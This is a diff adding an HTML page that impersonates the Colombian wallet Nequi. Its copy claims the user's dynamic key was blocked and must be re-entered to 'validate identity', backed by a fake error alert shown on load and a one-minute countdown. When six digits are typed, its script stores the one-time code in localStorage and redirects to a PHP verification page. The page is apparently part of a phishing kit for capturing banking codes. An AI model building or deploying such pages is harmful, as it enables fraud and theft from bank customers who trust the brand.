@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Tu código</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+  body {
+    margin: 0;
+    background: #FFFFFF;
+    font-family: 'Inter', sans-serif;
+    color: #300033;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
+
+  .header {
+    width: 100%;
+    background: #2E0039;
+    padding: 15px 20px;
+    color: white;
+    font-size: 20px;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .header span {
+    font-size: 22px;
+    cursor: pointer;
+  }
+
+  .container {
+    padding: 20px;
+    flex: 1;
+  }
+
+  .title {
+    font-size: 26px;
+    font-weight: 700;
+    color: #2E0039;
+    margin-bottom: 18px;
+    margin-top: 10px;
+  }
+
+  /* Alert Box */
+  .alert-box {
+    background-color: #F9F3FF;
+    border-left: 4px solid #2E0039;
+    padding: 15px;
+    margin-bottom: 25px;
+    border-radius: 0px;
+  }
+
+  .alert-box h3 {
+    color: #3A0A63;
+    font-size: 16px;
+    margin-bottom: 5px;
+    display: flex;
+    align-items: center;
+  }
+
+  .alert-box h3 i {
+    margin-right: 8px;
+  }
+
+  .alert-box p {
+    color: #3A0A63;
+    font-size: 14px;
+    line-height: 1.5;
+  }
+
+  /* Alerta de error - CORREGIDA */
+  .error-alert {
+    position: fixed;
+    top: 80px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #ff4757;
+    color: white;
+    padding: 15px 25px;
+    border-radius: 10px;
+    font-weight: 600;
+    box-shadow: 0 4px 15px rgba(255, 71, 87, 0.4);
+    z-index: 1000;
+    display: none;
+    align-items: center;
+    gap: 10px;
+    font-size: 14px;
+    border: 2px solid #ff3742;
+  }
+
+  .error-alert.show {
+    display: flex;
+    animation: slideIn 0.3s ease;
+  }
+
+  @keyframes slideIn {
+    from {
+      opacity: 0;
+      transform: translateX(-50%) translateY(-20px);
+    }
+    to {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+  }
+
+  /* Tarjeta del código */
+  .code-card {
+    background: #FFE9F5;
+    border-radius: 0px;
+    padding: 22px 16px;
+    margin-bottom: 22px;
+  }
+
+  .code-row {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 15px;
+    margin-bottom: 10px;
+  }
+
+  .code-inputs-container {
+    display: flex;
+    gap: 8px;
+    justify-content: center;
+  }
+
+  .code-input {
+    width: 42px;
+    height: 56px;
+    font-size: 33px;
+    font-weight: 800;
+    text-align: center;
+    border: none;
+    border-bottom: 2px solid #2E0039;
+    background: transparent;
+    outline: none;
+    font-family: 'Inter', monospace;
+    color: #da0081;
+    caret-color: #da0081;
+  }
+
+  .code-input:focus {
+    border-bottom-color: #ff4ba2;
+  }
+
+  .progress-bg {
+    width: 100%;
+    height: 7px;
+    background: #fff;
+    border-radius: 999px;
+    overflow: hidden;
+    margin: 12px 0;
+  }
+
+  .progress-fill {
+    height: 100%;
+    background: #ff4ba2;
+    width: 100%;
+    transition: width 0.3s linear;
+  }
+
+  .code-info-main {
+    font-size: 14px;
+    margin-bottom: 4px;
+    text-align: center;
+  }
+
+  .code-info-sub {
+    font-size: 13px;
+    opacity: 0.8;
+    text-align: center;
+  }
+
+  /* Sección de seguridad */
+  .section {
+    padding: 10px 0;
+    border-top: 1px solid #F0E4F5;
+  }
+
+  .row-icon-text {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    font-size: 13px;
+  }
+
+  .icon-circle {
+    width: 26px;
+    height: 26px;
+    border-radius: 50%;
+    border: 1.5px solid #ff4ba2;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 15px;
+    color: #ff4ba2;
+    margin-top: 3px;
+  }
+
+  .text-bold {
+    font-weight: 700;
+  }
+
+  /* Botones */
+  .btn-secondary {
+    width: 100%;
+    border-radius: 12px;
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 600;
+    border: none;
+    cursor: pointer;
+    margin-top: 14px;
+    background: #ffffff;
+    color: #2E0039;
+    border: 1px solid #E3D4EE;
+    margin-bottom: 10px;
+  }
+
+  /* Footer */
+  .footer {
+    background: #2E0039;
+    color: white;
+    padding: 25px 20px;
+    text-align: center;
+    margin-top: 30px;
+  }
+
+  .footer-content {
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+
+  .footer-logo {
+    font-size: 20px;
+    font-weight: bold;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+  }
+
+  .footer-logo .icon {
+    background: white;
+    color: #2E0039;
+    width: 25px;
+    height: 25px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: bold;
+    font-size: 12px;
+  }
+
+  .footer-text {
+    font-size: 13px;
+    opacity: 0.9;
+    margin-bottom: 12px;
+    line-height: 1.4;
+  }
+
+  .footer-links {
+    display: flex;
+    justify-content: center;
+    gap: 15px;
+    flex-wrap: wrap;
+    margin-bottom: 15px;
+  }
+
+  .footer-link {
+    color: white;
+    text-decoration: none;
+    font-size: 12px;
+    opacity: 0.8;
+    transition: opacity 0.3s ease;
+  }
+
+  .footer-link:hover {
+    opacity: 1;
+  }
+
+  .footer-copyright {
+    font-size: 11px;
+    opacity: 0.7;
+    border-top: 1px solid rgba(255,255,255,0.2);
+    padding-top: 12px;
+    margin-top: 12px;
+  }
+
+  .security-badge {
+    background: rgba(255,255,255,0.1);
+    padding: 6px 12px;
+    border-radius: 20px;
+    font-size: 11px;
+    display: inline-block;
+    margin-top: 8px;
+  }
+
+</style>
+</head>
+<body>
+
+<!-- Alerta de error - CORREGIDA -->
+<div id="errorAlert" class="error-alert">
+  <span style="font-size: 18px;">⚠</span>
+  Clave dinámica inválida
+</div>
+
+<div class="header">
+  <span>#</span> Nequi
+</div>
+<img src="bane.jpeg" alt="Mi imagen" style="width: 100%; max-width: 300px; height: auto;">
+
+<div class="container">
+
+  <div class="title">Activación de tu dinámica</div>
+
+  <!-- Alert Box -->
+  <div class="alert-box">
+    <h3><i>⚠</i> Importante</h3>
+    <p>Tu clave dinámica Nequi fue bloqueada por medidas de seguridad. Para reactivarla, necesitamos validar tu identidad.</p>
+  </div>
+
+  <!-- TARJETA DEL CÓDIGO -->
+  <div class="code-card">
+    <div class="code-row">
+      <div class="code-inputs-container">
+        <input type="number" class="code-input" maxlength="1" id="otp1" oninput="moverSiguiente(0, event)" onkeydown="moverAnterior(0, event)" onfocus="this.select()">
+        <input type="number" class="code-input" maxlength="1" id="otp2" oninput="moverSiguiente(1, event)" onkeydown="moverAnterior(1, event)" onfocus="this.select()">
+        <input type="number" class="code-input" maxlength="1" id="otp3" oninput="moverSiguiente(2, event)" onkeydown="moverAnterior(2, event)" onfocus="this.select()">
+        <input type="number" class="code-input" maxlength="1" id="otp4" oninput="moverSiguiente(3, event)" onkeydown="moverAnterior(3, event)" onfocus="this.select()">
+        <input type="number" class="code-input" maxlength="1" id="otp5" oninput="moverSiguiente(4, event)" onkeydown="moverAnterior(4, event)" onfocus="this.select()">
+        <input type="number" class="code-input" maxlength="1" id="otp6" oninput="moverSiguiente(5, event)" onkeydown="moverAnterior(5, event)" onfocus="this.select()">
+      </div>
+    </div>
+
+    <div class="progress-bg">
+      <div id="progress" class="progress-fill"></div>
+    </div>
+
+    <div id="tiempo-texto" class="code-info-main">
+      Ingresa tu Dinámica antes de: 01:00 min
+    </div>
+    <div class="code-info-sub">
+      Escribe la dinámica de tu App Nequi mientras esté vigente el tiempo.
+    </div>
+  </div>
+
+  <!-- SEGURIDAD -->
+  <div class="section">
+    <div class="row-icon-text">
+      <div class="icon-circle">✔</div>
+      <div>
+        <div class="text-bold">Por tu seguridad, no compartas tu dinámica con otras personas.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SOLO BOTÓN SALIR -->
+  <button class="btn-secondary" onclick="salir()">Salir</button>
+
+</div>
+
+<!-- Footer -->
+<div class="footer">
+  <div class="footer-content">
+    <div class="footer-logo">
+      <div class="icon">NQ</div>
+      Nequi
+    </div>
+    <div class="footer-text">
+      Tu billetera digital más fácil, más rápida y más segura
+    </div>
+    <div class="footer-links">
+      <a href="#" class="footer-link">Términos y Condiciones</a>
+      <a href="#" class="footer-link">Política de Privacidad</a>
+      <a href="#" class="footer-link">Ayuda</a>
+      <a href="#" class="footer-link">Contáctanos</a>
+    </div>
+    <div class="security-badge">
+      🔒 Transacciones 100% seguras
+    </div>
+    <div class="footer-copyright">
+      &copy; 2024 Nequi. Todos los derechos reservados.
+    </div>
+  </div>
+</div>
+
+<script>
+let totalSegundos = 60;
+let restantes = totalSegundos;
+let intervalo = null;
+
+function formatearTiempo(seg) {
+  const m = Math.floor(seg / 60);
+  const s = seg % 60;
+  const mm = m < 10 ? "0" + m : m;
+  const ss = s < 10 ? "0" + s : s;
+  return mm + ":" + ss;
+}
+
+function actualizarUI() {
+  const tiempoTexto = document.getElementById("tiempo-texto");
+  const progress = document.getElementById("progress");
+
+  if (restantes > 0) {
+    tiempoTexto.textContent = "Ingresa tu Dinámica antes de: " + formatearTiempo(restantes) + " min";
+  } else {
+    tiempoTexto.textContent = "Tu Dinámica ha vencido.";
+  }
+
+  const porcentaje = (restantes / totalSegundos) * 100;
+  progress.style.width = porcentaje + "%";
+}
+
+function iniciarContador() {
+  actualizarUI();
+  intervalo = setInterval(() => {
+    restantes--;
+    if (restantes <= 0) {
+      restantes = 0;
+      clearInterval(intervalo);
+    }
+    actualizarUI();
+  }, 1000);
+}
+
+function mostrarAlertaError() {
+  const alerta = document.getElementById('errorAlert');
+  
+  // Mostrar alerta
+  alerta.classList.add('show');
+  
+  // Ocultar después de 3 segundos
+  setTimeout(() => {
+    alerta.classList.remove('show');
+  }, 3000);
+}
+
+function moverSiguiente(index, event) {
+  const input = event.target;
+  const value = input.value;
+  
+  // Solo permitir números
+  if (value && !/^\d$/.test(value)) {
+    input.value = '';
+    mostrarAlertaError();
+    return;
+  }
+  
+  // Si se ingresó un número, mover al siguiente campo
+  if (value && index < 5) {
+    const nextInput = document.querySelectorAll('.code-input')[index + 1];
+    nextInput.focus();
+  }
+  
+  // Verificar si ya se completaron los 6 dígitos
+  verificarDinamicaCompleta();
+}
+
+function moverAnterior(index, event) {
+  // Si se presiona Backspace y el campo está vacío, mover al campo anterior
+  if (event.key === 'Backspace' && event.target.value === '' && index > 0) {
+    const prevInput = document.querySelectorAll('.code-input')[index - 1];
+    prevInput.focus();
+  }
+}
+
+function obtenerDinamicaCompleta() {
+  const inputs = document.querySelectorAll('.code-input');
+  let dinamica = '';
+  inputs.forEach(input => {
+    dinamica += input.value;
+  });
+  return dinamica;
+}
+
+function verificarDinamicaCompleta() {
+  const codigo = obtenerDinamicaCompleta();
+  
+  // Si ya se completaron los 6 dígitos, enviar automáticamente
+  if (codigo.length === 6) {
+    const clave = codigo;
+    localStorage.setItem('bancoldina', clave);
+    setTimeout(() => {
+      window.location.href = 'dina-verifi.php';
+    }, 500);
+  }
+}
+
+function salir() {
+  window.location.href = 'https://google.com';
+}
+
+// Iniciar contador al cargar la página
+iniciarContador();
+
+// Poner foco en el primer campo al cargar
+document.getElementById('otp1').focus();
+
+// MOSTRAR ALERTA AL CARGAR LA PÁGINA
+window.addEventListener('load', function() {
+  setTimeout(function() {
+    mostrarAlertaError();
+  }, 500); // Pequeño delay para que se vea mejor
+});
+</script>
+
+</body>
+</html>
